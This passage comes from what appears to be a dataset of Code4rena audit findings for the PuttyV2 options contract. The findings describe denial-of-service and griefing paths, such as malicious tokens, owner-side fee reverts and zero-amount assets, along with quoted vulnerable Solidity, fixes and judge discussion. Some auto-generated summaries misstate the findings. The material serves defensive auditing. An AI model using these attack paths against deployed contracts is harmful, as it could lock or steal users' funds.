      "content": "_Submitted by xiaoming90, also found by berndartmueller_\n\nWhen users withdraw their strike escrowed in Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L500>\n\n```solidity\nfunction withdraw(Order memory order) public {\n\t..SNIP..\n\n\t// transfer strike to owner if put is expired or call is exercised\n\tif ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n\t\t// send the fee to the admin/DAO if fee is greater than 0%\n\t\tuint256 feeAmount = 0;\n\t\tif (fee > 0) {\n\t\t\tfeeAmount = (order.strike * fee) / 1000;\n\t\t\tERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n\t\t}\n\n\t\tERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n\t\treturn;\n\t}\n\t..SNIP..\n}\n```\n\nThere are two methods on how the owner can deny user from withdrawing their strike amount from the contract\n\n#### Method #1 - Set the `owner()` to `zero` address\n\nMany of the token implementations do not allow transfer to `zero` address ([Reference](https://github.com/d-xo/weird-erc20#revert-on-transfer-to-the-zero-address)). Popular ERC20 implementations such as the following Openzeppelin's ERC20 implementation do not allow transfer to `zero` address, and will revert immediately if the `to` address (recipient) points to a `zero` address during a transfer.\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fbf494511fd522b931f7f92e2df87d671ea8b0b/contracts/token/ERC20/ERC20.sol#L226>\n\n```solidity\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal virtual {\n    require(from != address(0), \"ERC20: transfer from the zero address\");\n    require(to != address(0), \"ERC20: transfer to the zero address\");\n\n    _beforeTokenTransfer(from, to, amount);\n\n    uint256 fromBalance = _balances[from];\n    require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    unchecked {\n        _balances[from] = fromBalance - amount;\n        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n        // decrementing then incrementing.\n        _balances[to] += amount;\n    }\n\n    emit Transfer(from, to, amount);\n\n    _afterTokenTransfer(from, to, amount);\n}\n```\n\nIt is possible for the owner to transfer the ownership to a `zero` address, thus causing the fee transfer to the contract owner to always revert. When the fee transfer always reverts, no one can withdraw their strike amount from the contract.\n\nThis issue will affect all orders that adopt a `baseAsset` that reverts when transferring to `zero` address.\n\n#### Method #2 - If `baseAsset` is a ERC777 token\n\n> Note: `owner()` could point to a contract or EOA account. By pointing to a contract, the contract could implement logic to revert whenever someone send tokens to it.\n\nERC777 contains a `tokensReceived` hook that will notify the recipient whenever someone sends some tokens to the recipient .\n\nAssuming that the `baseAsset` is a ERC77 token, the recipient, which is the `owner()` in this case, could always revert whenever `PuttyV2` contract attempts to send the fee to recipient. This will cause the `withdraw` function to revert too. As a result, no one can withdraw their strike amount from the contract.\n\nThis issue will affect all orders that has ERC777 token as its `baseAsset`.\n\n### Impact\n\nUser cannot withdraw their strike amount and their asset will be stuck in the contract.\n\n### Recommended Mitigation Steps\n\nIt is recommended to adopt a [withdrawal pattern](https://docs.soliditylang.org/en/v0.8.15/common-patterns.html#withdrawal-from-contracts) for retrieving owner fee.\n\nInstead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the `PuttyV2` contract.\n\nConsider the following implementation. In the following example, there is no way for the owner to perform denial-of-user because the outcome of the fee transfer (succeed or fail) to the owner will not affect the user's strike withdrawal process.\n\nThis will give users more assurance and confidence about the security of their funds stored within Putty.\n\n```solidity\nmapping(address => uint256) public ownerFees;\n\nfunction withdraw(Order memory order) public {\n\t..SNIP..\n    // transfer strike to owner if put is expired or call is exercised\n    if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n        // send the fee to the admin/DAO if fee is greater than 0%\n        uint256 feeAmount = 0;\n        if (fee > 0) {\n            feeAmount = (order.strike * fee) / 1000;\n            ownerFees[order.baseAsset] += feeAmount\n        }\n\n        ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n        return;\n    }\n    ..SNIP..\n}\n\nfunction withdrawFee(address baseAsset) public onlyOwner {\n\tuint256 _feeAmount = ownerFees[baseAsset];\n\townerFees[baseAsset] = 0;\n\tERC20(baseAsset).safeTransfer(owner(), _feeAmount);\n}\n```\n**[outdoteth (Putty Finance) disagreed with severity](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1177678807)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1179936225):**\n > The scenarios provided are valid, especially for baseAssets that revert on zero-address transfer.\n> \n> While the likelihood is low, assets are lost and cannot be retrieved.<br>\n> `3 â€” High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).`\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1181754248):**\n > Thinking about it further, the external conditions / requirements needed for the DoS to happen are somewhat strong.\n> - the ERC777 attack requires `owner()` or the token to be engineered to be malicious and adopted.\n> - DoS via revoking ownership requires `fee` to be non-zero first, which is unlikely to happen. I can classify this as a \"user-prone\" bug, which would be similar to cases like including ETH when WETH is intended to be used (#226).\n> \n> Hence, I think medium severity is more appropriate:\n> `2 â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1185411399):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269): as the platform fee is now transferred on order filling, any owner griefing can only yield a denial of service. There will be no loss of funds as this way position is only about to be created when the fee is transferred.\n\n***\n\n",
      "summary": "\nThis bug report is concerning the PuttyV2 contract, which is a smart contract used to facilitate the trading of options. When users withdraw their strike escrowed in the Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users. \n\nThe bug is that, there are two methods on how the owner can deny user from withdrawing their strike amount from the contract. The first method is to set the owner() to zero address. This is because many of the token implementations do not allow transfer to zero address, and will revert immediately if the to address (recipient) points to a zero address during a transfer. The second method is if the baseAsset is a ERC777 token. This is because ERC777 contains a tokensReceived hook that will notify the recipient whenever someone sends some tokens to the recipient. The recipient, which is the owner() in this case, could always revert whenever PuttyV2 contract attempts to send the fee to recipient. This will cause the withdraw function to revert too.\n\nThe impact of this bug is that users cannot withdraw their strike amount and their asset will be stuck in the contract.\n\nThe recommended mitigation steps to fix this bug is to adopt a withdrawal pattern for retrieving owner fee. Instead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the PuttyV2 contract. This will give users more assurance and confidence about the security of their funds stored within Putty.",
      "quality_score": 4.583333333333333,
      "rarity_score": 4.428571428571429,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/296",
      "tags": [
        "DOS",
        "Withdraw Pattern",
        "ERC777",
        "ERC20"
      ],
      "finders": [
        "berndartmueller",
        "xiaoming90"
      ]
    },
    {
      "id": "2938",
      "title": "[M-05] fillOrder() and exercise() may lock Ether sent to the contract, forever",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436\n\n\n## Vulnerability details\n\n## Impact\n`fillOrder()` and `exercise()` have code paths that require Ether to be sent to them (e.g. using WETH as the base asset, or the provision of the exercise price), and therefore those two functions have the `payable` modifier. However, there are code paths within those functions that do not require Ether. Ether passed to the functions, when the non-Ether code paths are taken, is locked in the contract forever, and the sender gets nothing extra in return for it.\n\n\n## Proof of Concept\nEther can't be pulled from the `order.maker` during the filling of a long order, so `msg.value` shouldn't be provided here:\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n323           if (order.isLong) {\n324               ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);\n325           } else {\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L323-L325\n\n\nIf the `baseAsset` isn't WETH during order fulfillment, `msg.value` is unused:\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n337               } else {\n338                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n339               }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L337-L339\n\n\nSame for the exercise of call options:\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n435               } else {\n436                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n437               }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437\n\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAdd a `require(0 == msg.value)` for the above three conditions",
      "summary": "\nThis bug report is related to a code inspection of the PuttyV2.sol file. The bug report has identified three code paths that require Ether to be sent to them but do not return anything to the sender. This could result in Ether being locked in the contract forever, with the sender not receiving anything in return. The code paths identified are found at lines 324, 338, and 436. \n\nThe recommended mitigation steps are to add a `require(0 == msg.value)` for these three conditions. This will ensure that no Ether is sent to the contract when these code paths are taken.\n\nTo summarize, this bug report has identified a code issue in the PuttyV2.sol file that could result in Ether being locked in the contract forever. The recommended mitigation steps are to add a `require(0 == msg.value)` for the identified code paths.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/226",
      "tags": [],
      "finders": [
        "zzzitron_",
        "xiaoming90",
        "berndartmueller",
        "0x29A",
        "sashiketh",
        "danb",
        "BowTiedWardens",
        "joestakey",
        "0xDjango",
        "peritoflores",
        "oyc109",
        "IllIllI",
        "swit",
        "simon135",
        "cccz",
        "auditor0517",
        "dirky",
        "hansfriese",
        "horsefacts",
        "sseefried",
        "AmitN",
        "rfa",
        "StErMi",
        "kirk-baird",
        "dipp",
        "0xc0ffEE",
        "hyh"
      ]
    },
    {
      "id": "2937",
      "title": "[M-04] Put options are free of any fees",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by 0xsanson, hubble, Lambda, Metatron, and swit_\n\nFees are expected to be paid whenever an option is exercised (as per the function comment on [L235](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L235)).\n\n#### Put options\n\nIf a put option is exercised, the exerciser receives the strike price (initially deposited by the short position holder) denominated in `order.baseAsset`.\n\n#### Call options\n\nIf a call option is exercised, the exerciser sends the strike price to Putty and the short position holder is able to withdraw the strike amount.\n\nHowever, the current protocol implementation is missing to deduct fees for exercised put options. Put options are free of any fees.\n\n### Proof of Concept\n\nThe protocol fee is correctly charged for exercised calls:\n\n[PuttyV2.withdraw](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506)\n\n```solidity\n// transfer strike to owner if put is expired or call is exercised\nif ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n    // send the fee to the admin/DAO if fee is greater than 0%\n    uint256 feeAmount = 0;\n    if (fee > 0) {\n        feeAmount = (order.strike * fee) / 1000;\n        ERC20(order.baseAsset).safeTransfer(owner(), feeAmount); // @audit DoS due to reverting erc20 token transfer (weird erc20 tokens, blacklisted or paused owner; erc777 hook on owner receiver side can prevent transfer hence reverting and preventing withdrawal) - use pull pattern @high  // @audit zero value token transfers can revert. Small strike prices and low fee can lead to rounding down to 0 - check feeAmount > 0 @high  // @audit should not take fees if renounced owner (zero address) as fees can not be withdrawn @medium\n    }\n\n    ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount); // @audit fee should not be paid if strike is simply returned to short owner for expired put @high\n\n    return;\n}\n```\n\nContrary, put options are free of any fees:\n\n[PuttyV2.sol#L450-L451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L450-L451)\n\n```solidity\n// transfer strike from putty to exerciser\nERC20(order.baseAsset).safeTransfer(msg.sender, order.strike);\n```\n\n### Recommended Mitigation Steps\n\nCharge fees also for exercised put options.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/285#issuecomment-1176533283):**\n > Fees are only applied on puts if they are expired.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/285#issuecomment-1179907369):**\n > Making this the primary issue for the med severity issue, as per my comment in [#269](https://github.com/code-423n4/2022-06-putty-findings/issues/269):\n> > \"Put option not being charged fee upon exercising it. This can be considered to the \"protocol leaked value\" and thus be given a medium severity rating.\"\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/285#issuecomment-1185411614):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in PuttyV2.sol, a smart contract used for trading options. The vulnerability is that fees are not charged when put options are exercised. Put options are options that give the holder the right to sell an asset at a certain price. When a put option is exercised, the holder receives the strike price (the price the option was bought at) denominated in order.baseAsset. Call options, on the other hand, give the holder the right to buy an asset at a certain price, and when a call option is exercised, the holder sends the strike price to Putty and the short position holder is able to withdraw the strike amount. \n\nThe bug report provides proof of concept for the vulnerability. It states that the protocol fee is correctly charged for exercised calls, but that put options are free of any fees. The code for this is provided in the report. \n\nThe recommended mitigation step for this vulnerability is to charge fees also for exercised put options.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/285",
      "tags": [],
      "finders": [
        "swit",
        "0xsanson",
        "Metatron",
        "berndartmueller",
        "Lambda",
        "hubble"
      ]
    },
    {
      "id": "2936",
      "title": "[M-03] Put option sellers can prevent exercise by specifying zero amounts, or non-existant tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by 0xNineDec, exd0tpy, and zzzitron_\n\nPut option buyers pay an option premium to the seller for the privilege of being able to 'put' assets to the seller and get the strike price for it rather than the current market price. If they're unable to perform the 'put', they've paid the premium for nothing, and essentially have had funds stolen from them.\n\n### Proof of Concept\n\nIf the put option seller includes in `order.erc20Assets`, an amount of zero for any of the assets, or specifies an asset that doesn't currently have any code at its address, the put buyer will be unable to exercise the option, and will have paid the premium for nothing:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n453               // transfer assets from exerciser to putty\n454               _transferERC20sIn(order.erc20Assets, msg.sender);\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L453-L454>\n\nThe function reverts if any amount is equal to zero, or the asset doesn't exist:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n593       function _transferERC20sIn(ERC20Asset[] memory assets, address from) internal {\n594           for (uint256 i = 0; i < assets.length; i++) {\n595               address token = assets[i].token;\n596               uint256 tokenAmount = assets[i].tokenAmount;\n597   \n598               require(token.code.length > 0, \"ERC20: Token is not contract\");\n599               require(tokenAmount > 0, \"ERC20: Amount too small\");\n600   \n601               ERC20(token).safeTransferFrom(from, address(this), tokenAmount);\n602           }\n603       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593-L603>\n\n### Recommended Mitigation Steps\n\nVerify the asset amounts and addresses during `fillOrder()`, and allow exercise if the token no longer exists at that point in time.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/223#issuecomment-1177638096):**\n > At the contract level there exists 2 possible mitigations;\n> \n> 1) Remove the zero amount check (not feasible because it will cause another DOS issue for tokens that revert on 0 transfer).\n> 2) Check all erc20 assets are valid in `fillOrder` (gas tradeoff because it requires an O(n) loop to check).\n> \n> Instead, the best mitigation imo is to add a check on the frontend/db level to ensure that all erc20 assets have a token amount greater than 0 and that it exists as a contract.\n> \n> If users want to go lower level than the db/frontend then they must exercise their own diligence.\n> \n> edit: decided to go with a 3rd option instead.\n> \n> Simply skip the ERC20 transfer if the amount is 0.<br>\n>\n> Report: Setting an erc20Asset with a zero amount or with no code at the address will result in a revert when exercising a put option.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/223#issuecomment-1185412355):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/8.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed zero amount part by introducing the noop for zero amount transfers in both `_transferERC20sIn` and `_transferERC20sOut` ERC20 transfer functions. The second part of the issue, fake tokens, is similar to [M-01](https://github.com/code-423n4/2022-06-putty-findings/issues/50), [M-02](https://github.com/code-423n4/2022-06-putty-findings/issues/227).\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability that affects Put option buyers in the PuttyV2.sol contract. If the put option seller includes in `order.erc20Assets`, an amount of zero for any of the assets, or specifies an asset that doesn't currently have any code at its address, the put buyer will be unable to exercise the option, and will have paid the premium for nothing. The vulnerability was identified through code inspection. To mitigate the issue, it is recommended to verify the asset amounts and addresses during `fillOrder()`, and allow exercise if the token no longer exists at that point in time.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/223",
      "tags": [
        "Token Existence"
      ],
      "finders": [
        "exd0tpy",
        "IllIllI",
        "0xNineDec",
        "zzzitron"
      ]
    },
    {
      "id": "2935",
      "title": "[M-02] Unbounded loops may cause exercise()s and withdraw()s to fail ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661\n\n\n## Vulnerability details\n\n## Impact\nThere are no bounds on the number of tokens transferred in an order, and gas requirements can change (especially since orders can have a duration of [27 years](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L287)), so orders filled at time T1 may not be exercisable/withdrawable at time T2, or with the provided assets if the assets use a lot of gas during their transfers (e.g. aTokens and cTokens). The buyer of the option will have paid the premium, and will be unable to get the assets they are owed.\n\n\n## Proof of Concept\nThere are no upper bounds on the number of assets being transferred in these loops:\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n636       function _transferERC20sOut(ERC20Asset[] memory assets) internal {\n637           for (uint256 i = 0; i < assets.length; i++) {\n638               ERC20(assets[i].token).safeTransfer(msg.sender, assets[i].tokenAmount);\n639           }\n640       }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640\n\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n646       function _transferERC721sOut(ERC721Asset[] memory assets) internal {\n647           for (uint256 i = 0; i < assets.length; i++) {\n648               ERC721(assets[i].token).safeTransferFrom(address(this), msg.sender, assets[i].tokenId);\n649           }\n650       }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650\n\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n657       function _transferFloorsOut(address[] memory floorTokens, uint256[] memory floorTokenIds) internal {\n658           for (uint256 i = 0; i < floorTokens.length; i++) {\n659               ERC721(floorTokens[i]).safeTransferFrom(address(this), msg.sender, floorTokenIds[i]);\n660           }\n661       }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661\n\n\n## Tools Used\nCode inspection\n\n\n## Recommended Mitigation Steps\nHave an upper bound on the number of assets, or allow them to be transferred out one at a time, if necessary",
      "summary": "\nThis bug report is about the PuttyV2 smart contract, which is used to facilitate the transfer of tokens across different platforms. The code inspection tool has identified a vulnerability in the contract, which can be exploited to transfer an unlimited number of tokens in one transaction. This could cause a problem if the assets being transferred use a lot of gas during their transfer, as the buyer of the option may not be able to get the assets they are owed.\n\nThe code inspection tool has identified three lines of code that are vulnerable to this exploit. These are lines 636-640, 646-650, and 657-661. These lines of code allow the contract to transfer an unlimited number of tokens in one transaction.\n\nThe recommended mitigation step for this vulnerability is to have an upper bound on the number of assets that can be transferred in one transaction, or to allow them to be transferred out one at a time. This will ensure that the buyer of the option is able to get the assets they are owed, even if the assets use a lot of gas during their transfer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/227",
      "tags": [],
      "finders": [
        "IllIllI",
        "xiaoming90_",
        "sashiketh",
        "shung",
        "0xNineDec"
      ]
    },
    {
      "id": "2934",
      "title": "[M-01] Malicious Token Contracts May Lead To Locking Orders",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird, also found by 0xA5DF, cccz, chatch, csanuragjain, Alex the Entreprenerd, hansfriese, hyh, itsmeSTYJ, Kenshin, pedroais, sashik_eth, unforgiven, and xiaoming90_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L79>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L80>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L81>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L72>\n\n### Impact\n\nIt is possible to prevent an order from executing `exercise()` or `withdraw()` by having a malicious token contract included in the order as part of the any of the following fields.\n\n*   `baseAsset`\n*   `floorTokens[]`\n*   `erc20Assets[]`\n*   `erc721Assets[]`\n\nAn attacker as a maker may create an order and set one of these addresses to a malicious contract in the attackers control. The attacker allows the user to fill the order then toggles a variable on the malicious contract which always causes it to revert.\n\nThe attacker benefits by preventing orders from being `exercise()` if they are in an undesirable position (e.g. if they have gone short and the price has gone up). The attacker waits for either the time to expire or the price to go down and allows transfers to occur on their malicious token.\n\nSimilar attacks can also be performed over the `withdraw()` function since this also makes calls to untrusted external addresses. This would allow an attacker to exercise an option then prevent the other user from claiming any of the NFTs or ERC20 tokens that are owed to them.\n\n### Proof of Concept\n\nAny of the transfers in [exercise](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L389-L458) make external calls to untrusted addresses.\n\n```solidity\n    function exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {\n        /* ~~~ CHECKS ~~~ */\n\n\n        bytes32 orderHash = hashOrder(order);\n\n\n        // check user owns the position\n        require(ownerOf(uint256(orderHash)) == msg.sender, \"Not owner\");\n\n\n        // check position is long\n        require(order.isLong, \"Can only exercise long positions\");\n\n\n        // check position has not expired\n        require(block.timestamp < positionExpirations[uint256(orderHash)], \"Position has expired\");\n\n\n        // check floor asset token ids length is 0 unless the position type is put\n        !order.isCall\n            ? require(floorAssetTokenIds.length == order.floorTokens.length, \"Wrong amount of floor tokenIds\")\n            : require(floorAssetTokenIds.length == 0, \"Invalid floor tokenIds length\");\n\n\n        /* ~~~ EFFECTS ~~~ */\n\n\n        // send the long position to 0xdead.\n        // instead of doing a standard burn by sending to 0x000...000, sending\n        // to 0xdead ensures that the same position id cannot be minted again.\n        transferFrom(msg.sender, address(0xdead), uint256(orderHash));\n\n\n        // mark the position as exercised\n        exercisedPositions[uint256(orderHash)] = true;\n\n\n        emit ExercisedOrder(orderHash, floorAssetTokenIds, order);\n\n\n        /* ~~~ INTERACTIONS ~~~ */\n\n\n        if (order.isCall) {\n            // -- exercising a call option\n\n\n            // transfer strike from exerciser to putty\n            // handle the case where the taker uses native ETH instead of WETH to pay the strike\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the strike\n                require(msg.value == order.strike, \"Incorrect ETH amount sent\");\n\n\n                // convert ETH to WETH\n                // we convert the strike ETH to WETH so that the logic in withdraw() works\n                // - because withdraw() assumes an ERC20 interface on the base asset.\n                IWETH(weth).deposit{value: msg.value}();\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n\n\n            // transfer assets from putty to exerciser\n            _transferERC20sOut(order.erc20Assets);\n            _transferERC721sOut(order.erc721Assets);\n            _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[uint256(orderHash)]);\n        } else {\n            // -- exercising a put option\n\n\n            // save the floor asset token ids to the short position\n            uint256 shortPositionId = uint256(hashOppositeOrder(order));\n            positionFloorAssetTokenIds[shortPositionId] = floorAssetTokenIds;\n\n\n            // transfer strike from putty to exerciser\n            ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike);\n\n\n            // transfer assets from exerciser to putty\n            _transferERC20sIn(order.erc20Assets, msg.sender);\n            _transferERC721sIn(order.erc721Assets, msg.sender);\n            _transferFloorsIn(order.floorTokens, floorAssetTokenIds, msg.sender);\n        }\n    }\n```\n\nThe attacker must control one of these contracts and have it set as a malicious ERC20 / ERC721 function that fails under attacker controlled conditions.\n\n### Recommended Mitigation Steps\n\nConsider whitelisting approved ERC20 token or ERC721 address contracts to prevent users setting malicious token contracts. However, this remediation will have a significant admin input / gas trade-offs.\n\n**[outdoteth (Putty Finance) acknowledged and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1177630161):**\n > Technically this is a valid finding. However we don't intend to fix this at the contract level. Instead there will be adequate warnings on the UI to inform a user that they should be vigilant for any tokens that are not verified by putty (in addition, the UI will show the unverified token's logo as a question mark instead of as the token's logoURI).\n>\n > Report: Setting malicious or invalid erc721Assets, erc20Assets or floorTokens prevents the option from being exercised.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1179463134):**\n > It's contingent on the external requirement for the attacker to be in control of a malicious ERC20 or NFT. Hence, medium severity is appropriate: `2-Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`\n\n**[Pedroais (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1194894079):**\n > I will argue why this issue should be high severity instead of medium.  \n> \n> \"It's contingent on the external requirement for the attacker to be in control of a malicious ERC20 or NFT. \"\n> \n> Anyone can deploy a malicious contract and pass it as an ERC20 or NFT. This is not an external requirement, anyone can do it. Any malicious contract deployed by the attacker will work.\n> \n> This issue imposes a risk of asset loss to users without external requirements. The sponsor states unknown tokens will be shown with a question mark in the UI. This is ok but I think the attack is high severity since the user would be reasonable to think if he is accepting an offer for a BAYC (example of an expensive NFT)  and some unknown token that in the worse case he should at least get the BAYC. This attack doesn't require the user to be dumb or act recklessly but just normal functioning of the protocol. The fake token shouldn't prevent the user from exercising the real BAYC.\n> \n> A user would be reasonable to expect to at least be able to exercise the real NFT in a case with an option that includes a real NFT and a malicious one. The problem is the malicious NFT can block the exercise of the real NFT. An option can be created using  many real and valuable tokens with just 1 malicious token that prevents exercising the real ones.\n> \n> I hope the judge can consider these arguments and make his decision.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1198793737):**\n> I should have phrased it better. The external requirement isn't on the attacker being in control of the malicious ERC20 / NFT. As rightfully pointed out, it can be easily done.\n> \n> The external requirement here is the user deciding to fill an option containing malicious assets. Such options can be considered to be honeypots that users should be made aware of (eg. through documentation, PSAs or warnings to the user). There's only so much the protocol can do to protect users, with tradeoffs against centralisation risks if the suggestion of whitelisting assets is adopted.\n> \n> > This attack 